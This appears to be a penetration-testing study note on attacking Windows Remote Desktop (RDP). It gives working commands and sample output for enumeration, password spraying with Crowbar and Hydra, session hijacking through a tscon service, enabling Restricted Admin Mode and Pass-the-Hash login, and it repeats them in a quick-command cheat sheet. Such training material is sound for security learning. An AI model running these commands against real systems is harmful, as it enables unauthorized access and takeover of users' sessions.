# Attacking Common Services - Attacking RDP

## Overview

**Remote Desktop Protocol (RDP)** is a proprietary Microsoft protocol that provides a **graphical remote access session** to another system over the network.

It is one of the most widely used remote administration technologies in Windows environments because it gives administrators a full desktop session, effectively letting them work on a remote machine as though they were sitting in front of it.

RDP is commonly used by:

- system administrators
- help desk teams
- managed service providers (MSPs)
- infrastructure engineers
- outsourced support teams

Because of that, it is also a very common target during internal and external assessments.

By default, RDP uses:

- **TCP 3389**
- and in some environments also **UDP 3389**

---

## Why RDP Matters in an Assessment

RDP is valuable because it can provide:

- full GUI access
- remote administration capability
- access to installed applications not usable via CLI
- opportunities for password spraying
- session hijacking opportunities
- Pass-the-Hash opportunities in specific configurations
- privilege escalation or lateral movement paths

Think of RDP as a front door to a Windows desktop.  
If SMB gives you filesystem and service-level access, RDP gives you the actual chair at the machine.

---

# Basic Enumeration

## Identifying RDP with Nmap

A basic scan for RDP looks like this:

```bash
nmap -Pn -p3389 192.168.2.143
```

### Example Output

```text
Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

### What this tells you

- the host is reachable
- RDP is listening on TCP 3389
- the service is identified as `ms-wbt-server`

### Why `-Pn` was used

`-Pn` disables host discovery and treats the host as up.  
This is useful when ICMP or other discovery probes are filtered, but it can make scans slower.

---

## Recommended Follow-Up Enumeration

A more detailed RDP scan is often useful:

```bash
sudo nmap -sV -sC -p3389 <target>
```

You may also use:

```bash
nmap -p3389 --script rdp* <target>
```

### Why this helps

These scans may reveal:

- SSL/TLS details
- certificate information
- encryption support
- RDP-specific metadata
- hints about host naming

---

# Misconfigurations

## Password Guessing and Password Spraying

Since RDP uses credential-based authentication, one of the most common attacks is **password guessing**.

However, Windows environments often enforce:

- account lockout thresholds
- failed login counters
- disabled accounts after repeated failures

Because of that, **password spraying** is usually safer than brute force.

### Difference Between Brute Force and Password Spraying

#### Brute Force
Try many passwords against one account.

This is noisy and can trigger lockouts quickly.

#### Password Spraying
Try one password across many usernames.

This reduces the chance of locking out a single account and is usually the more realistic attack path against RDP.

---

# Password Spraying Against RDP

## Using Crowbar

### Example User List

```text
root
test
user
guest
admin
administrator
```

### Example Command

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### Example Output

```text
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

### What this means

Crowbar successfully authenticated to the target RDP service using:

- username: `administrator`
- password: `password123`

### Why Crowbar is useful

Crowbar is handy when you want a simple RDP-focused spray or brute force tool without extra complexity.

---

## Using Hydra

Another option is Hydra.

### Example Command

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

### Example Output

```text
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### Important Hydra Notes

Hydra warns that RDP often does not handle aggressive parallel connections well.

That is why it recommends lower task counts such as:

- `-t 1`
- `-t 4`

and sometimes delays such as:

- `-W 1`
- `-W 3`

### Why this matters

Too many parallel RDP attempts can:

- destabilise the target
- cause false negatives
- increase detection risk
- trigger defensive controls

---

# Logging In to RDP

Once you have valid credentials, you can connect using a Linux RDP client such as:

- `rdesktop`
- `xfreerdp`

---

## Using rdesktop

```bash
rdesktop -u admin -p password123 192.168.2.143
```

### Example Prompt

```text
ATTENTION! The server uses an invalid security certificate which can not be trusted...
Do you trust this certificate (yes/no)? yes
```

### What this means

The target is presenting a certificate that is:

- self-signed
- not trusted by your system
- often generated locally by the Windows host

This is very common in internal environments.

### What to check

Look at:

- certificate subject
- certificate issuer
- fingerprint
- host naming information

These can sometimes reveal useful naming conventions or infrastructure clues.

---

## Using xfreerdp

A more common modern choice is:

```bash
xfreerdp /v:<target> /u:<user> /p:<password>
```

Example:

```bash
xfreerdp /v:192.168.2.143 /u:administrator /p:password123
```

### Why xfreerdp is often preferred

It is flexible and supports:

- clipboard redirection
- drive mapping
- dynamic resolution
- Pass-the-Hash in some cases
- modern authentication options

---

# Protocol-Specific Attacks

Once you already have access to a machine, RDP can become more than just a login target.

In some situations, it can be abused for:

- **session hijacking**
- **privilege escalation**
- **user impersonation**
- **Pass-the-Hash GUI access**

---

# RDP Session Hijacking

## Concept

If a user is already logged in via RDP to a compromised machine, and you have sufficient privileges, you may be able to hijack their session without knowing their password.

This is especially valuable when the logged-in user is more privileged than you.

Examples:

- help desk admin
- server admin
- domain admin
- application admin

---

## Scenario

Suppose we are logged in as `juurena`, who has local administrator rights.

We discover another active RDP user:

- `lewen`

We want to hijack that user’s session.

---

## Step 1: Enumerate Sessions

```cmd
query user
```

### Example Output

```text
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

### What this tells you

- your current session is `rdp-tcp#13`
- the target session is ID `2`
- the victim session belongs to `lewen`

---

## Step 2: Use `tscon.exe`

Microsoft’s `tscon.exe` allows connecting one session to another.

### General Syntax

```cmd
tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>
```

Example:

```cmd
tscon 2 /dest:rdp-tcp#13
```

### Why this matters

This tells Windows to attach the target session to your current RDP connection.

---

## Requirement: SYSTEM Privileges

To do this reliably, you need **SYSTEM privileges**, not just ordinary user rights.

One way to obtain this is to create a Windows service, which by default runs as **Local System**.

---

## Step 3: Create a Service to Run `tscon`

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

### Example Output

```text
[SC] CreateService SUCCESS
```

---

## Step 4: Start the Service

```cmd
net start sessionhijack
```

### What happens next

If successful, the session for `lewen` is attached to your current RDP window.

You effectively take over that user’s desktop session.

---

## Why this is powerful

You may inherit access to:

- administrative tools
- internal consoles
- privileged browsers
- cached credentials
- mapped drives
- other domain-connected resources

### Important Note

This session hijacking approach **no longer works on Server 2019**.

That is an important caveat when assessing modern environments.

---

# RDP Pass-the-Hash (PtH)

## Overview

Sometimes you have:

- a valid NT hash
- but no plaintext password

If the target allows it, you may still be able to authenticate to RDP using **Pass-the-Hash**.

This is especially useful when:

- GUI access is needed
- an app only exists in the desktop session
- browser or GUI-only tooling must be accessed
- you want a visual foothold rather than shell-only access

---

## Caveat: Restricted Admin Mode

For RDP PtH to work, **Restricted Admin Mode** must be enabled on the target.

It is **disabled by default** on most systems.

If it is not enabled, you will usually receive an authentication failure or policy-related denial.

---

## Enabling Restricted Admin Mode

The required registry value is:

- `DisableRestrictedAdmin`
- under:
  `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`

### Command

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### What this does

It enables Restricted Admin Mode, allowing RDP logon without sending reusable plaintext credentials in the normal way, which is what makes PtH possible here.

---

## Using xfreerdp for PtH

Once enabled, you can use:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### What `/pth` means

It tells `xfreerdp` to authenticate using the supplied NT hash instead of a plaintext password.

### Example Output Snippets

```text
[WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)'
[WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz
```

This is normal in many internal environments and usually just means the server is using a self-signed cert.

---

## When RDP PtH Is Worth Trying

RDP PtH is worth testing when:

- you have an NT hash
- cracking failed or is not practical
- the user is known to have RDP rights
- GUI access would materially help the engagement
- you suspect the target is configured for Restricted Admin Mode

---

## Limitations of RDP PtH

It will not work everywhere.

Possible blockers include:

- Restricted Admin Mode disabled
- target policy restrictions
- account not permitted to log in via RDP
- local security policy preventing the logon type
- NLA / host configuration issues
- patched or hardened systems

So this should be treated as an **opportunistic technique**, not a guaranteed one.

---

# Operational Considerations

## Account Lockout Risk

When attacking RDP credentials, always consider:

- domain lockout policy
- local lockout policy
- detection thresholds
- security monitoring

RDP is a high-visibility service. Failed logons are often monitored.

### Safer approach

Prefer:

- password spraying
- limited attempts
- careful spacing between attempts
- targeted username lists

---

## RDP Certificates

RDP commonly presents self-signed certificates.

These can reveal:

- hostnames
- domain naming conventions
- certificate validity periods
- whether the box is likely a workstation or server

This is not a vulnerability on its own, but it is useful context.

---

## GUI Access Changes the Game

A shell and a desktop session are not the same.

GUI access may expose:

- browser sessions
- password managers
- saved credentials
- internal admin tools
- RDP-connected jump hosts
- email clients
- chat tools
- privileged MMC snap-ins
- databases or enterprise apps with no CLI equivalent

That is why successful RDP access can be much more impactful than it first appears.

---

# Enumeration Priorities

When you find RDP, focus on:

1. **Is TCP 3389 open?**
2. **Can you fingerprint the host further?**
3. **Does the host reveal interesting certificate details?**
4. **Is password spraying feasible without lockout risk?**
5. **Do you already have hashes or credentials for users with RDP rights?**
6. **Is GUI access actually valuable for your objective?**
7. **Are privileged users already logged in?**
8. **Can session hijacking apply?**
9. **Could Restricted Admin Mode allow PtH?**

---

# High-Value Findings

The following RDP-related findings are especially valuable:

- valid RDP credentials
- weak/default password accepted
- successful password spray
- privileged user currently logged in via RDP
- session hijacking opportunity
- Restricted Admin Mode enabled
- successful Pass-the-Hash via RDP
- GUI access to privileged tools or applications
- hostnames exposed in self-signed RDP certificates

---

# Quick Commands

## Basic RDP Discovery

```bash
nmap -Pn -p3389 <target>
sudo nmap -sV -sC -p3389 <target>
nmap -p3389 --script rdp* <target>
```

## Crowbar Password Spray

```bash
crowbar -b rdp -s <target>/32 -U users.txt -c 'password123'
```

## Hydra Password Spray

```bash
hydra -L usernames.txt -p 'password123' <target> rdp
```

## RDP Login

```bash
rdesktop -u <user> -p <password> <target>
xfreerdp /v:<target> /u:<user> /p:<password>
```

## Enumerate Logged-In Users

```cmd
query user
```

## Create Service for Session Hijack

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
net start sessionhijack
```

## Enable Restricted Admin Mode

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## RDP Pass-the-Hash

```bash
xfreerdp /v:<target> /u:<user> /pth:<NTHASH>
```

---

# Key Takeaways

- RDP is one of the most important Windows remote management services to understand.
- It provides full GUI access, which can be significantly more powerful than shell-only access.
- Password spraying is usually safer than brute force against RDP.
- Crowbar and Hydra can both be used for RDP credential attacks.
- If you already have admin access on a box, active RDP sessions may be hijackable in older or compatible environments.
- RDP PtH can work, but only in specific configurations, especially when Restricted Admin Mode is enabled.
- Even when direct exploitation is not possible, RDP is still a valuable visibility point for:
  - hostname disclosure
  - certificate details
  - valid users
  - privilege paths
  - interactive session discovery

---

# Tags

#attacking-common-services  
#rdp  
#windows  
#remote-access  
#password-spraying  
#session-hijacking  
#passthehash  
#xfreerdp  
#hydra  
#crowbar  
#enumeration  
#obsidian